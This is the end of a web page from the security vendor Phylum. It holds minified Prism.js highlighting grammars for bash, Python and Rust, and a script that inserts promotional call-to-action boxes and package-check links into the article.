wapon|sync|sysctl|tac|tail|tar|tee|time|timeout|top|touch|tr|traceroute|tsort|tty|umount|uname|unexpand|uniq|units|unrar|unshar|unzip|update-grub|uptime|useradd|userdel|usermod|users|uudecode|uuencode|v|vcpkg|vdir|vi|vim|virsh|vmstat|wait|watch|wc|wget|whereis|which|who|whoami|write|xargs|xdg-open|yarn|yes|zenity|zip|zsh|zypper)(?=$|[)\s;|&])/,lookbehind:!0},keyword:{pattern:/(^|[\s;|&]|[<>]\()(?:case|do|done|elif|else|esac|fi|for|function|if|in|select|then|until|while)(?=$|[)\s;|&])/,lookbehind:!0},builtin:{pattern:/(^|[\s;|&]|[<>]\()(?:\.|:|alias|bind|break|builtin|caller|cd|command|continue|declare|echo|enable|eval|exec|exit|export|getopts|hash|help|let|local|logout|mapfile|printf|pwd|read|readarray|readonly|return|set|shift|shopt|source|test|times|trap|type|typeset|ulimit|umask|unalias|unset)(?=$|[)\s;|&])/,lookbehind:!0,alias:"class-name"},boolean:{pattern:/(^|[\s;|&]|[<>]\()(?:false|true)(?=$|[)\s;|&])/,lookbehind:!0},"file-descriptor":{pattern:/\B&\d\b/,alias:"important"},operator:{pattern:/\d?<>|>\||\+=|=[=~]?|!=?|<<[<-]?|[&\d]?>>|\d[<>]&?|[<>][&=]?|&[>&]?|\|[&|]?/,inside:{"file-descriptor":{pattern:/^\d/,alias:"important"}}},punctuation:/\$?\(\(?|\)\)?|\.\.|[{}[\];\\]/,number:{pattern:/(^|\s)(?:[1-9]\d*|0)(?:[.,]\d+)?\b/,lookbehind:!0}},a.inside=e.languages.bash;for(var s=["comment","function-name","for-or-select","assign-left","parameter","string","environment","function","keyword","builtin","boolean","file-descriptor","operator","punctuation","number"],o=n.variable[1].inside,i=0;i<s.length;i++)o[s[i]]=e.languages.bash[s[i]];e.languages.sh=e.languages.bash,e.languages.shell=e.languages.bash}(Prism);
Prism.languages.python={comment:{pattern:/(^|[^\\])#.*/,lookbehind:!0,greedy:!0},"string-interpolation":{pattern:/(?:f|fr|rf)(?:("""|''')[\s\S]*?\1|("|')(?:\\.|(?!\2)[^\\\r\n])*\2)/i,greedy:!0,inside:{interpolation:{pattern:/((?:^|[^{])(?:\{\{)*)\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}])+\})+\})+\}/,lookbehind:!0,inside:{"format-spec":{pattern:/(:)[^:(){}]+(?=\}$)/,lookbehind:!0},"conversion-option":{pattern:/![sra](?=[:}]$)/,alias:"punctuation"},rest:null}},string:/[\s\S]+/}},"triple-quoted-string":{pattern:/(?:[rub]|br|rb)?("""|''')[\s\S]*?\1/i,greedy:!0,alias:"string"},string:{pattern:/(?:[rub]|br|rb)?("|')(?:\\.|(?!\1)[^\\\r\n])*\1/i,greedy:!0},function:{pattern:/((?:^|\s)def[ \t]+)[a-zA-Z_]\w*(?=\s*\()/g,lookbehind:!0},"class-name":{pattern:/(\bclass\s+)\w+/i,lookbehind:!0},decorator:{pattern:/(^[\t ]*)@\w+(?:\.\w+)*/m,lookbehind:!0,alias:["annotation","punctuation"],inside:{punctuation:/\./}},keyword:/\b(?:_(?=\s*:)|and|as|assert|async|await|break|case|class|continue|def|del|elif|else|except|exec|finally|for|from|global|if|import|in|is|lambda|match|nonlocal|not|or|pass|print|raise|return|try|while|with|yield)\b/,builtin:/\b(?:__import__|abs|all|any|apply|ascii|basestring|bin|bool|buffer|bytearray|bytes|callable|chr|classmethod|cmp|coerce|compile|complex|delattr|dict|dir|divmod|enumerate|eval|execfile|file|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|intern|isinstance|issubclass|iter|len|list|locals|long|map|max|memoryview|min|next|object|oct|open|ord|pow|property|range|raw_input|reduce|reload|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|unichr|unicode|vars|xrange|zip)\b/,boolean:/\b(?:False|None|True)\b/,number:/\b0(?:b(?:_?[01])+|o(?:_?[0-7])+|x(?:_?[a-f0-9])+)\b|(?:\b\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\B\.\d+(?:_\d+)*)(?:e[+-]?\d+(?:_\d+)*)?j?(?!\w)/i,operator:/[-+%=]=?|!=|:=|\*\*?=?|\/\/?=?|<[<=>]?|>[=>]?|[&|^~]/,punctuation:/[{}[\];(),.:]/},Prism.languages.python["string-interpolation"].inside.interpolation.inside.rest=Prism.languages.python,Prism.languages.py=Prism.languages.python;
!function(e){for(var a="/\\*(?:[^*/]|\\*(?!/)|/(?!\\*)|<self>)*\\*/",t=0;t<2;t++)a=a.replace(/<self>/g,(function(){return a}));a=a.replace(/<self>/g,(function(){return"[^\\s\\S]"})),e.languages.rust={comment:[{pattern:RegExp("(^|[^\\\\])"+a),lookbehind:!0,greedy:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/b?"(?:\\[\s\S]|[^\\"])*"|b?r(#*)"(?:[^"]|"(?!\1))*"\1/,greedy:!0},char:{pattern:/b?'(?:\\(?:x[0-7][\da-fA-F]|u\{(?:[\da-fA-F]_*){1,6}\}|.)|[^\\\r\n\t'])'/,greedy:!0},attribute:{pattern:/#!?\[(?:[^\[\]"]|"(?:\\[\s\S]|[^\\"])*")*\]/,greedy:!0,alias:"attr-name",inside:{string:null}},"closure-params":{pattern:/([=(,:]\s*|\bmove\s*)\|[^|]*\||\|[^|]*\|(?=\s*(?:\{|->))/,lookbehind:!0,greedy:!0,inside:{"closure-punctuation":{pattern:/^\||\|$/,alias:"punctuation"},rest:null}},"lifetime-annotation":{pattern:/'\w+/,alias:"symbol"},"fragment-specifier":{pattern:/(\$\w+:)[a-z]+/,lookbehind:!0,alias:"punctuation"},variable:/\$\w+/,"function-definition":{pattern:/(\bfn\s+)\w+/,lookbehind:!0,alias:"function"},"type-definition":{pattern:/(\b(?:enum|struct|trait|type|union)\s+)\w+/,lookbehind:!0,alias:"class-name"},"module-declaration":[{pattern:/(\b(?:crate|mod)\s+)[a-z][a-z_\d]*/,lookbehind:!0,alias:"namespace"},{pattern:/(\b(?:crate|self|super)\s*)::\s*[a-z][a-z_\d]*\b(?:\s*::(?:\s*[a-z][a-z_\d]*\s*::)*)?/,lookbehind:!0,alias:"namespace",inside:{punctuation:/::/}}],keyword:[/\b(?:Self|abstract|as|async|await|become|box|break|const|continue|crate|do|dyn|else|enum|extern|final|fn|for|if|impl|in|let|loop|macro|match|mod|move|mut|override|priv|pub|ref|return|self|static|struct|super|trait|try|type|typeof|union|unsafe|unsized|use|virtual|where|while|yield)\b/,/\b(?:bool|char|f(?:32|64)|[ui](?:8|16|32|64|128|size)|str)\b/],function:/\b[a-z_]\w*(?=\s*(?:::\s*<|\())/,macro:{pattern:/\b\w+!/,alias:"property"},constant:/\b[A-Z_][A-Z_\d]+\b/,"class-name":/\b[A-Z]\w*\b/,namespace:{pattern:/(?:\b[a-z][a-z_\d]*\s*::\s*)*\b[a-z][a-z_\d]*\s*::(?!\s*<)/,inside:{punctuation:/::/}},number:/\b(?:0x[\dA-Fa-f](?:_?[\dA-Fa-f])*|0o[0-7](?:_?[0-7])*|0b[01](?:_?[01])*|(?:(?:\d(?:_?\d)*)?\.)?\d(?:_?\d)*(?:[Ee][+-]?\d+)?)(?:_?(?:f32|f64|[iu](?:8|16|32|64|size)?))?\b/,boolean:/\b(?:false|true)\b/,punctuation:/->|\.\.=|\.{1,3}|::|[{}[\];(),:]/,operator:/[-+*\/%!^]=?|=[=>]?|&[&=]?|\|[|=]?|<<?=?|>>?=?|[@?]/},e.languages.rust["closure-params"].inside.rest=e.languages.rust,e.languages.rust.attribute.inside.string=e.languages.rust.string}(Prism);
</script>
<script>

    // The GitHub logo
    const githubLogoSvg = `<svg style="margin-top: 2px; margin-bottom: -2px;" height="1em" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="1em" data-view-component="true" class="octicon octicon-mark-github v-align-middle">
    <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
</svg>`;

    // The types of CTAs we can have
    CTAS = {
    	'cta': {
        'text': `Protect yourself from software supply chain attacks`,
      	'button': `${githubLogoSvg}  Free Github App`,
        'link': 'https://github.com/marketplace/phylum-io',
      },
    	'github': {
        'text': `Protect yourself from software supply chain attacks`,
      	'button': `${githubLogoSvg} Install Phylum`,
        'link': 'https://github.com/marketplace/phylum-io',
      },
      'bookmeeting': {
        'text': `Find out how Phylum can help mature your AppSec program`,
      	'button': `Book Meeting`,
        'link': 'https://www.phylum.io/contact-us',
      },
    };
    
    /**
     * Determine if the element is in view for the user.
     */
    isElementInViewport = (el) => {
        // Special bonus for those using jQuery
        if (typeof jQuery === "function" && el instanceof jQuery) {
            el = el[0];
        }

        var rect = el.getBoundingClientRect();

        return (
            rect.top >= 0 &&
            rect.left >= 0 &&
            rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && /* or $(window).height() */
            rect.right <= (window.innerWidth || document.documentElement.clientWidth) /* or $(window).width() */
        );
    }
    
    /**
     * Find all links to packages on Phylum and replace them with a "check package" button.
     */
    check_package_links = (data) => {
    	const regex = /<a href=['"]https:\/\/app.phylum.io\/package\/(?<eco>.*?)?\/(?<name>.*?)?\/(?<version>[0-9\.\-]+)(.*?)['"]>(.*?)<\/a>/dgi;
    	return data.replace(regex,  '<code>$2</code> <a href="https://app.phylum.io/package/$1/$2/$3" target="_blank" class="check-package">⚠️ Check Package</a>');
	}
    
    /**
     * Convert the text in the article to a CTA box.
     */
    add_cta = (data) => {
      // For each potential CTA, see if we see the relevant tag
      for (const [ctaType, cta] of Object.entries(CTAS)) { 
        const re = new RegExp("--( ?)"+ctaType+"( ?)--");
        if (re.test(data)) {
      	    data = data.replace(re, `<div class="cta">
                                      <div class="item left">
                                        <div class="typewriter-container">
                                            <div id="cta-text">${cta.text}</div>
                                        </div>
                                      </div>
                                      <div class="item right">
                                            <a href="${cta.link}" target="_blank" id="gh-cta-btn">${cta.button}</a>
                                      </div>
                                    </div>`);
        }
      }
      
      return data;
    }
    
    // Have we triggered the CTA yet?
    let ctaTriggered = false;
  
    /**
     * Adds the style to the element to trigger the typing effect.
     */
    trigger_cta_animation = () => {
        const ctaBox = document.getElementById("cta-text");
        if(isElementInViewport(ctaBox)) {
            ctaBox.classList.add("typed-out");
            ctaTriggered = true;
        }
    }
    
    onload = (event) => {
        // Check on load just in case the element is already in the viewport.
        trigger_cta_animation();
        
        // Otherwise, check after every scroll.
        onscroll = (event) => { 
            if(!ctaTriggered) {
            	trigger_cta_animation();
            }
        };
    
        document.getElementById('gh-cta-btn').onclick = function() {
            gtag('event', 'github_cta_clicked', {});
        }
    };
    
    let data = document.getElementsByTagName('article')[0].innerHTML;
    data = add_cta(data);
    data = check_package_links(data);
	document.getElementsByTagName('article')[0].innerHTML = data;
</script>

</body>
</html>
